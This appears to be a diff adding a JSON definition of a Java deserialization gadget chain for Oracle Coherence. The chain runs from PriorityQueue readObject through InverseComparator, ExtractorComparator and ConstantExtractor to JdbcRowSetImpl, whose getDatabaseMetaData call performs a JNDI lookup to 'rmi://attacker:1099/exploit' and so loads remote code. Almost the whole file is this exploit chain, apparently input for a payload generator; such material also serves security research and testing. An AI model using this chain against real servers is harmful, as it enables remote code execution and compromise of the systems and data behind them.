@@ -1,0 +1,34 @@
+{
+  "chain_type": "Post-PSU: InverseComparator wrapping ExtractorComparator + reporter extractor",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→InverseComparator→ExtractorComparator→extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.comparator.InverseComparator",
+      "field_overrides": {
+        "m_comparator": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "com.tangosol.coherence.reporter.extractor.ConstantExtractor",
+      "field_overrides": {
+        "m_sName": "databaseMetaData",
+        "m_aoParam": [],
+        "m_nTarget": 0
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "rmi://attacker:1099/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData→JNDI"
+}
